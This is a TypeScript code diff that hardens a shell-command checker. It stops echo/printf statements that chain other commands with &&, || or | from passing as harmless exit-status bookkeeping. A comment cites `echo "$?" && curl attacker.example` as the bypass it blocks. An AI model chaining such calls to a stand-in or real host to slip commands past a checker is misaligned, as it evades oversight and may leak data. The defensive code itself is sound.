@@ -44,13 +44,40 @@ function splitStatements(command: string): string[] {
 const STATUS_CAPTURE = /^([A-Za-z_][A-Za-z0-9_]*)=\$\?$/;
 
 /**
+ * True when `statement` contains a `&&`, `||`, or `|` outside quotes. `splitStatements` only breaks
+ * statements on bare `;`/newline, so `echo "$?" && curl attacker.example` survives as ONE statement —
+ * without this check it would read as a bare `$?`-printing statement and let the chained command ride
+ * along as free, unaccounted-for "bookkeeping".
+ */
+function hasUnquotedShellOperator(statement: string): boolean {
+  let quote: "'" | '"' | null = null;
+  for (let index = 0; index < statement.length; index += 1) {
+    const char = statement[index]!;
+    if (quote) {
+      if (char === quote && (quote === "'" || statement[index - 1] !== "\\")) quote = null;
+      continue;
+    }
+    if (char === "'" || char === '"') { quote = char; continue; }
+    if (char === "|") return true;
+    // `&` chains or backgrounds a command, but in `>&`/`2>&1` it is part of a redirect — rejecting that
+    // would block a legitimate `printf '…' "$status" 2>&1` for no gain. `&&` is still caught: its first
+    // `&` is never preceded by `>`.
+    if (char === "&" && statement[index - 1] !== ">") return true;
+  }
+  return false;
+}
+
+/**
  * True when `statement` is an `echo`/`printf` that actually reports the exit status — either `$?`
  * directly, or a variable name previously captured from it (`status=$?` then `echo "$status"`). A bare
  * `echo`/`printf` that names neither always succeeds regardless of what ran before it, exactly like
- * `true` or `:`, so it must not be treated as a no-op: doing so would let it mask a failing needle.
+ * `true` or `:`, so it must not be treated as a no-op: doing so would let it mask a failing needle. A
+ * statement chaining anything else via `&&`/`||`/`|` is never bookkeeping either, no matter what it
+ * prints: the chained command is real, unrecorded-by-the-claim execution.
  */
 function printsStatus(statement: string, capturedNames: ReadonlySet<string>): boolean {
   if (!/^(?:printf|echo)\b/.test(statement)) return false;
+  if (hasUnquotedShellOperator(statement)) return false;
   if (statement.includes("$?")) return true;
   for (const name of capturedNames) {
     if (new RegExp(`\\$\\{?${name}\\b`).test(statement)) return true;
